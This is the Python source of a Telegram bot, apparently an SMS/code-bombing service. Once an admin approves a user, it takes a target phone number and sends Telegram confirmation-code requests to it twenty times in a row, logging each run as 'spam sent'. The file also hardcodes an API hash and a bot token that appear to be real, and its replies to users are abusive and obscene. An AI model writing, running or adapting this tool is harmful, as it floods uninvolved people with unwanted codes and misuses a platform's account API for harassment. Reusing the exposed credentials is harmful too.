import asyncio
import logging
import sqlite3
from telethon import TelegramClient, events
from telethon.tl.functions.account import SendConfirmPhoneCodeRequest
from telethon.tl.types import CodeSettings
from telethon.tl.types import KeyboardButtonCallback
from telethon.errors import FloodWaitError

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

API_ID = 35911533
API_HASH = '11dafcdc1514796c867055023716d39a'
BOT_TOKEN = '8346402249:AAGrv_AIuNJNJ06-Y2-vTASyB_NRgyzhJZI'
ADMIN_ID = 8471847665

conn = sqlite3.connect('bot.db', check_same_thread=False)
cursor = conn.cursor()
cursor.execute('''CREATE TABLE IF NOT EXISTS users (
    user_id INTEGER PRIMARY KEY,
    username TEXT,
    phone TEXT,
    status TEXT DEFAULT 'pending',
    step TEXT,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
)''')
cursor.execute('''CREATE TABLE IF NOT EXISTS requests (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    user_id INTEGER,
    admin_id INTEGER,
    action TEXT,
    timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
)''')
conn.commit()

def get_user(user_id):
    cursor.execute('SELECT * FROM users WHERE user_id = ?', (user_id,))
    return cursor.fetchone()

def add_or_update_user(user_id, username=None, phone=None, status=None, step=None):
    existing = get_user(user_id)
    if existing is None:
        cursor.execute('INSERT INTO users (user_id) VALUES (?)', (user_id,))
    if username is not None:
        cursor.execute('UPDATE users SET username = ? WHERE user_id = ?', (username, user_id))
    if phone is not None:
        cursor.execute('UPDATE users SET phone = ? WHERE user_id = ?', (phone, user_id))
    if status is not None:
        cursor.execute('UPDATE users SET status = ? WHERE user_id = ?', (status, user_id))
    if step is not None:
        cursor.execute('UPDATE users SET step = ? WHERE user_id = ?', (step, user_id))
    conn.commit()

def update_status(user_id, status):
    cursor.execute('UPDATE users SET status = ? WHERE user_id = ?', (status, user_id))
    conn.commit()

def update_step(user_id, step):
    cursor.execute('UPDATE users SET step = ? WHERE user_id = ?', (step, user_id))
    conn.commit()

def add_request(user_id, admin_id, action):
    cursor.execute('INSERT INTO requests (user_id, admin_id, action) VALUES (?, ?, ?)',
                   (user_id, admin_id, action))
    conn.commit()

client = TelegramClient('bot', API_ID, API_HASH).start(bot_token=BOT_TOKEN)

@client.on(events.NewMessage(pattern='/start'))
async def start_handler(event):
    sender = await event.get_sender()
    user_id = sender.id
    user = get_user(user_id)
    if user:
        status = user[3]
        if status == 'approved':
            await event.respond('ty uzhe odobren pishi username s @')
            update_step(user_id, 'username')
            return
        elif status == 'pending':
            await event.respond('zayavka uzhe otpravlena, zhdi odobreniya')
            return
        elif status == 'rejected':
            await event.respond('tebya otklonili, otpravlyayu novuyu zayavku')
            update_status(user_id, 'pending')
            update_step(user_id, None)
    else:
        add_or_update_user(user_id, status='pending', step=None)

    await event.respond('tvoia zaiavka otpravlena, zhdi odobreniya')
    username = sender.username if sender.username else str(user_id)
    await client.send_message(ADMIN_ID, f'ziavka ot @{username}',
                              buttons=[[KeyboardButtonCallback('priniat', f'accept_{user_id}'),
                                        KeyboardButtonCallback('otklonit', f'reject_{user_id}')]])
    add_request(user_id, ADMIN_ID, 'sent')
    logger.info(f'User {user_id} sent request')

@client.on(events.CallbackQuery)
async def callback_handler(event):
    if event.sender_id != ADMIN_ID:
        await event.answer('ne admin')
        return
    data = event.data.decode()
    if data.startswith('accept_'):
        user_id = int(data.split('_')[1])
        if get_user(user_id) is None:
            await event.answer('user not found')
            return
        update_status(user_id, 'approved')
        update_step(user_id, 'username')
        await client.send_message(user_id, 'tebia odobrili pishi username s @')
        await event.answer('priniato')
        add_request(user_id, ADMIN_ID, 'accepted')
        logger.info(f'User {user_id} approved')
    elif data.startswith('reject_'):
        user_id = int(data.split('_')[1])
        if get_user(user_id) is None:
            await event.answer('user not found')
            return
        update_status(user_id, 'rejected')
        update_step(user_id, None)
        await client.send_message(user_id, 'otkloneno idi nahui')
        await event.answer('otkloneno')
        add_request(user_id, ADMIN_ID, 'rejected')
        logger.info(f'User {user_id} rejected')

@client.on(events.NewMessage)
async def message_handler(event):
    if event.sender_id == ADMIN_ID:
        return
    if event.text is None or not event.text.strip():
        return
    if event.text.startswith('/'):
        return

    sender = await event.get_sender()
    user_id = sender.id
    logger.info(f'Message from {user_id}: {event.text}')

    user = get_user(user_id)
    if user is None:
        add_or_update_user(user_id, status='pending', step=None)
        await event.respond('zaregistrirovan, zhdi odobreniya')
        username = sender.username if sender.username else str(user_id)
        await client.send_message(ADMIN_ID, f'ziavka ot @{username}',
                                  buttons=[[KeyboardButtonCallback('priniat', f'accept_{user_id}'),
                                            KeyboardButtonCallback('otklonit', f'reject_{user_id}')]])
        add_request(user_id, ADMIN_ID, 'sent')
        return

    status = user[3]
    if status == 'pending':
        await event.respond('zhdi odobreniya adminom')
        return
    if status == 'rejected':
        await event.respond('ty otklonen, napishi /start dlya novoy zayavki')
        return
    if status != 'approved':
        await event.respond('napishi /start')
        return

    step = user[4]
    if step is None:
        await event.respond('napishi /start')
        return

    if step == 'username':
        username = event.text.strip()
        if not username.startswith('@') or len(username) < 2:
            await event.respond('pishi s @ i ne menee 2 simvolov')
            return
        add_or_update_user(user_id, username=username, step='phone')
        await event.respond('phone:')
        logger.info(f'User {user_id} entered username {username}')
    elif step == 'phone':
        phone = event.text.strip()
        if not phone.startswith('+') or not phone[1:].isdigit():
            await event.respond('nomer dolzhen byt s + i tolko cifry')
            return
        add_or_update_user(user_id, phone=phone)
        try:
            for _ in range(20):
                await client(SendConfirmPhoneCodeRequest(
                    phone_number=phone,
                    settings=CodeSettings(
                        allow_flashcall=False,
                        current_number=True,
                        allow_app_hash=False
                    )
                ))
                await asyncio.sleep(0.5)
            await event.respond('gatova tvoia mama sdohla')
            update_step(user_id, None)
            logger.info(f'Spam sent to {phone} for user {user_id}')
        except FloodWaitError as e:
            await event.respond(f'flood wait {e.seconds}s')
            logger.warning(f'FloodWait for user {user_id}: {e.seconds}s')
        except Exception as e:
            await event.respond(f'oibka {str(e)}')
            logger.error(f'Error for user {user_id}: {e}')
        finally:
            if get_user(user_id) and get_user(user_id)[4] == 'phone':
                update_step(user_id, None)

logger.info('Bot started')
client.run_until_disconnected()
